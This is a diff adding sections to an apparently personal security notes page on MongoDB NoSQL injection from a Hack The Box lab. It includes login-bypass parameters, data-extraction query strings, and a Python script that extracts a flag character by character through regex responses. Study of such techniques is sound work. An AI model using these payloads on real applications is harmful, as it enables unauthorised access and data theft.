@@ -1806,6 +1806,56 @@
   
 </li>
         
+          <li class="md-nav__item">
+  <a href="#authentication-bypass" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        Authentication bypass
+      
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#in-band-data-extraction" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        In-Band Data Extraction
+      
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#blind-data-extraction" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        Blind Data Extraction
+      
+    </span>
+  </a>
+  
+    <nav class="md-nav" aria-label="Blind Data Extraction">
+      <ul class="md-nav__list">
+        
+          <li class="md-nav__item">
+  <a href="#automating-blind-exploitation" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        Automating Blind Exploitation
+      
+    </span>
+  </a>
+  
+</li>
+        
+      </ul>
+    </nav>
+  
+</li>
+        
       </ul>
     </nav>
   
@@ -2166,6 +2216,56 @@
   
 </li>
         
+          <li class="md-nav__item">
+  <a href="#authentication-bypass" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        Authentication bypass
+      
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#in-band-data-extraction" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        In-Band Data Extraction
+      
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#blind-data-extraction" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        Blind Data Extraction
+      
+    </span>
+  </a>
+  
+    <nav class="md-nav" aria-label="Blind Data Extraction">
+      <ul class="md-nav__list">
+        
+          <li class="md-nav__item">
+  <a href="#automating-blind-exploitation" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        Automating Blind Exploitation
+      
+    </span>
+  </a>
+  
+</li>
+        
+      </ul>
+    </nav>
+  
+</li>
+        
       </ul>
     </nav>
   
@@ -2370,6 +2470,126 @@
 </span><span id="__span-2-2">db.apples.updateMany<span class="o">({}</span>,<span class="w"> </span><span class="o">{</span><span class="nv">$inc</span>:<span class="w"> </span><span class="o">{</span>quantity:<span class="w"> </span><span class="m">1</span>,<span class="w"> </span><span class="s2">&quot;price&quot;</span>:<span class="w"> </span><span class="m">1</span><span class="o">}})</span><span class="w"> </span><span class="c1"># increase the prices of all apples at the same time</span>
 </span><span id="__span-2-3">db.apples.replaceOne<span class="o">({</span>type:<span class="s1">&#39;Pink Lady&#39;</span><span class="o">}</span>,<span class="w"> </span><span class="o">{</span>name:<span class="w"> </span><span class="s1">&#39;Pink Lady&#39;</span>,<span class="w"> </span>price:<span class="w"> </span><span class="m">0</span>.99,<span class="w"> </span>color:<span class="w"> </span><span class="s1">&#39;Pink&#39;</span><span class="o">})</span><span class="w"> </span><span class="c1"># completely replace the document</span>
 </span><span id="__span-2-4">db.apples.remove<span class="o">({</span>price:<span class="w"> </span><span class="o">{</span><span class="nv">$lt</span>:<span class="w"> </span><span class="m">0</span>.8<span class="o">}})</span><span class="w"> </span><span class="c1"># remove matched documents</span>
+</span></code></pre></div></td></tr></table></div>
+<h3 id="authentication-bypass">Authentication bypass</h3>
+<div class="language-php highlight"><table class="highlighttable"><tr><th colspan="2" class="filename"><span class="filename">PHP</span></th></tr><tr><td class="linenos"><div class="linenodiv"><pre><span></span><span class="normal">1</span>
+<span class="normal">2</span>
+<span class="normal">3</span>
+<span class="normal">4</span>
+<span class="normal">5</span></pre></div></td><td class="code"><div><pre><span></span><code><span id="__span-3-1"><span class="x">email[$ne]=test@test.com&amp;password[$ne]=test // URL encoded parameters passed to PHP equal to password: {$ne: test}</span>
+</span><span id="__span-3-2"><span class="x">email[$regex]=.*&amp;email[$regex]=.* // alternative to also return a match on any document</span>
+</span><span id="__span-3-3"><span class="x">email=admin%40mangomail.com&amp;password[$ne]=x // when email known and password not known</span>
+</span><span id="__span-3-4"><span class="x">email[$gt]=&amp;password[$gt]= // any string is greater than an empty string</span>
+</span><span id="__span-3-5"><span class="x">email[$gte]=&amp;password[$gte]= // works same as previous</span>
+</span></code></pre></div></td></tr></table></div>
+<h3 id="in-band-data-extraction">In-Band Data Extraction</h3>
+<div class="language-bash highlight"><table class="highlighttable"><tr><th colspan="2" class="filename"><span class="filename">Bash</span></th></tr><tr><td class="linenos"><div class="linenodiv"><pre><span></span><span class="normal">1</span>
+<span class="normal">2</span>
+<span class="normal">3</span>
+<span class="normal">4</span>
+<span class="normal">5</span>
+<span class="normal">6</span></pre></div></td><td class="code"><div><pre><span></span><code><span id="__span-4-1">http://&lt;ip&gt;:&lt;port&gt;/?q<span class="o">[</span><span class="nv">$regex</span><span class="o">]=</span>.*<span class="w"> </span><span class="c1"># return whole collection get query</span>
+</span><span id="__span-4-2">http://&lt;ip&gt;:&lt;port&gt;/?q<span class="o">[</span><span class="nv">$ne</span><span class="o">]=</span><span class="s1">&#39;doesntExist&#39;</span>
+</span><span id="__span-4-3">http://&lt;ip&gt;:&lt;port&gt;/?q<span class="o">[</span><span class="nv">$gt</span><span class="o">]=</span><span class="s1">&#39;&#39;</span>
+</span><span id="__span-4-4">http://&lt;ip&gt;:&lt;port&gt;/?q<span class="o">[</span><span class="nv">$gte</span><span class="o">]=</span><span class="s1">&#39;&#39;</span>
+</span><span id="__span-4-5">http://&lt;ip&gt;:&lt;port&gt;/?q<span class="o">[</span><span class="nv">$gte</span><span class="o">]=</span><span class="s1">&#39;~&#39;</span>
+</span><span id="__span-4-6">http://&lt;ip&gt;:&lt;port&gt;/?q<span class="o">[</span><span class="nv">$lte</span><span class="o">]=</span><span class="s1">&#39;~&#39;</span>
+</span></code></pre></div></td></tr></table></div>
+<h3 id="blind-data-extraction">Blind Data Extraction</h3>
+<div class="language-json highlight"><table class="highlighttable"><tr><th colspan="2" class="filename"><span class="filename">JSON</span></th></tr><tr><td class="linenos"><div class="linenodiv"><pre><span></span><span class="normal"> 1</span>
+<span class="normal"> 2</span>
+<span class="normal"> 3</span>
+<span class="normal"> 4</span>
+<span class="normal"> 5</span>
+<span class="normal"> 6</span>
+<span class="normal"> 7</span>
+<span class="normal"> 8</span>
+<span class="normal"> 9</span>
+<span class="normal">10</span>
+<span class="normal">11</span>
+<span class="normal">12</span>
+<span class="normal">13</span>
+<span class="normal">14</span>
+<span class="normal">15</span>
+<span class="normal">16</span></pre></div></td><td class="code"><div><pre><span></span><code><span id="__span-5-1"><span class="c1">// Using regex to find a value char by char by comparing responses to the POST request</span>
+</span><span id="__span-5-2"><span class="p">{</span>
+</span><span id="__span-5-3"><span class="w">    </span><span class="nt">&quot;trackingNum&quot;</span><span class="p">:{</span>
+</span><span id="__span-5-4"><span class="w">        </span><span class="nt">&quot;$regex&quot;</span><span class="p">:</span><span class="s2">&quot;^3.*&quot;</span>
+</span><span id="__span-5-5"><span class="w">    </span><span class="p">}</span>
+</span><span id="__span-5-6"><span class="p">}</span>
+</span><span id="__span-5-7"><span class="p">{</span>
+</span><span id="__span-5-8"><span class="w">    </span><span class="nt">&quot;trackingNum&quot;</span><span class="p">:{</span>
+</span><span id="__span-5-9"><span class="w">        </span><span class="nt">&quot;$regex&quot;</span><span class="p">:</span><span class="s2">&quot;^32.*&quot;</span>
+</span><span id="__span-5-10"><span class="w">    </span><span class="p">}</span>
+</span><span id="__span-5-11"><span class="p">}</span>
+</span><span id="__span-5-12"><span class="p">{</span>
+</span><span id="__span-5-13"><span class="w">    </span><span class="nt">&quot;trackingNum&quot;</span><span class="p">:{</span>
+</span><span id="__span-5-14"><span class="w">        </span><span class="nt">&quot;$regex&quot;</span><span class="p">:</span><span class="s2">&quot;^32A.*&quot;</span>
+</span><span id="__span-5-15"><span class="w">    </span><span class="p">}</span>
+</span><span id="__span-5-16"><span class="p">}</span>
+</span></code></pre></div></td></tr></table></div>
+<h4 id="automating-blind-exploitation">Automating Blind Exploitation</h4>
+<div class="language-py highlight"><table class="highlighttable"><tr><th colspan="2" class="filename"><span class="filename">Python</span></th></tr><tr><td class="linenos"><div class="linenodiv"><pre><span></span><span class="normal"> 1</span>
+<span class="normal"> 2</span>
+<span class="normal"> 3</span>
+<span class="normal"> 4</span>
+<span class="normal"> 5</span>
+<span class="normal"> 6</span>
+<span class="normal"> 7</span>
+<span class="normal"> 8</span>
+<span class="normal"> 9</span>
+<span class="normal">10</span>
+<span class="normal">11</span>
+<span class="normal">12</span>
+<span class="normal">13</span>
+<span class="normal">14</span>
+<span class="normal">15</span>
+<span class="normal">16</span>
+<span class="normal">17</span>
+<span class="normal">18</span>
+<span class="normal">19</span>
+<span class="normal">20</span>
+<span class="normal">21</span>
+<span class="normal">22</span>
+<span class="normal">23</span>
+<span class="normal">24</span>
+<span class="normal">25</span>
+<span class="normal">26</span>
+<span class="normal">27</span>
+<span class="normal">28</span>
+<span class="normal">29</span>
+<span class="normal">30</span>
+<span class="normal">31</span></pre></div></td><td class="code"><div><pre><span></span><code><span id="__span-6-1"><span class="ch">#!/usr/bin/python3</span>
+</span><span id="__span-6-2">
+</span><span id="__span-6-3"><span class="kn">import</span><span class="w"> </span><span class="nn">requests</span>
+</span><span id="__span-6-4"><span class="kn">import</span><span class="w"> </span><span class="nn">json</span>
+</span><span id="__span-6-5">
+</span><span id="__span-6-6"><span class="c1"># Oracle</span>
+</span><span id="__span-6-7"><span class="k">def</span><span class="w"> </span><span class="nf">oracle</span><span class="p">(</span><span class="n">t</span><span class="p">):</span>
+</span><span id="__span-6-8">    <span class="n">r</span> <span class="o">=</span> <span class="n">requests</span><span class="o">.</span><span class="n">post</span><span class="p">(</span>
+</span><span id="__span-6-9">        <span class="s2">&quot;http://154.57.164.70:32584/index.php&quot;</span><span class="p">,</span>
+</span><span id="__span-6-10">        <span class="n">headers</span> <span class="o">=</span> <span class="p">{</span><span class="s2">&quot;Content-Type&quot;</span><span class="p">:</span> <span class="s2">&quot;application/json&quot;</span><span class="p">},</span>
+</span><span id="__span-6-11">        <span class="n">data</span> <span class="o">=</span> <span class="n">json</span><span class="o">.</span><span class="n">dumps</span><span class="p">({</span><span class="s2">&quot;trackingNum&quot;</span><span class="p">:</span> <span class="n">t</span><span class="p">})</span>
+</span><span id="__span-6-12">    <span class="p">)</span>
+</span><span id="__span-6-13">    <span class="k">return</span> <span class="s2">&quot;bmdyy&quot;</span> <span class="ow">in</span> <span class="n">r</span><span class="o">.</span><span class="n">text</span> <span class="c1"># use part of the response to confirm request was valid</span>
+</span><span id="__span-6-14">
+</span><span id="__span-6-15"><span class="c1"># Make sure the oracle is functioning correctly</span>
+</span><span id="__span-6-16"><span class="k">assert</span> <span class="p">(</span><span class="n">oracle</span><span class="p">(</span><span class="s2">&quot;X&quot;</span><span class="p">)</span> <span class="o">==</span> <span class="kc">False</span><span class="p">)</span>
+</span><span id="__span-6-17"><span class="k">assert</span> <span class="p">(</span><span class="n">oracle</span><span class="p">({</span><span class="s2">&quot;$regex&quot;</span><span class="p">:</span> <span class="s2">&quot;^HTB{.*&quot;</span><span class="p">})</span> <span class="o">==</span> <span class="kc">True</span><span class="p">)</span>
+</span><span id="__span-6-18">
+</span><span id="__span-6-19"><span class="c1"># Dump the tracking number</span>
+</span><span id="__span-6-20"><span class="n">trackingNum</span> <span class="o">=</span> <span class="s2">&quot;HTB{&quot;</span> <span class="c1"># Tracking number is known to start with &#39;HTB{&#39;</span>
+</span><span id="__span-6-21"><span class="k">for</span> <span class="n">_</span> <span class="ow">in</span> <span class="nb">range</span><span class="p">(</span><span class="mi">32</span><span class="p">):</span> <span class="c1"># Repeat the following 32 times</span>
+</span><span id="__span-6-22">    <span class="k">for</span> <span class="n">c</span> <span class="ow">in</span> <span class="s2">&quot;0123456789abcdef&quot;</span><span class="p">:</span> <span class="c1"># Loop through characters [0-9a-f]</span>
+</span><span id="__span-6-23">        <span class="k">if</span> <span class="n">oracle</span><span class="p">({</span><span class="s2">&quot;$regex&quot;</span><span class="p">:</span> <span class="s2">&quot;^&quot;</span> <span class="o">+</span> <span class="n">trackingNum</span> <span class="o">+</span> <span class="n">c</span><span class="p">}):</span> <span class="c1"># Check if &lt;trackingNum&gt; + &lt;char&gt; matches with $regex</span>
+</span><span id="__span-6-24">            <span class="n">trackingNum</span> <span class="o">+=</span> <span class="n">c</span> <span class="c1"># If it does, append character to trackingNum ...</span>
+</span><span id="__span-6-25">            <span class="k">break</span> <span class="c1"># ... and break out of the loop</span>
+</span><span id="__span-6-26"><span class="n">trackingNum</span> <span class="o">+=</span> <span class="s2">&quot;}&quot;</span> <span class="c1"># Append known &#39;}&#39; to end of tracking number</span>
+</span><span id="__span-6-27">
+</span><span id="__span-6-28"><span class="c1"># Make sure the tracking number is correct</span>
+</span><span id="__span-6-29"><span class="k">assert</span> <span class="p">(</span><span class="n">oracle</span><span class="p">(</span><span class="n">trackingNum</span><span class="p">)</span> <span class="o">==</span> <span class="kc">True</span><span class="p">)</span>
+</span><span id="__span-6-30">
+</span><span id="__span-6-31"><span class="nb">print</span><span class="p">(</span><span class="s2">&quot;Tracking Number: &quot;</span> <span class="o">+</span> <span class="n">trackingNum</span><span class="p">)</span>
 </span></code></pre></div></td></tr></table></div>
 
 
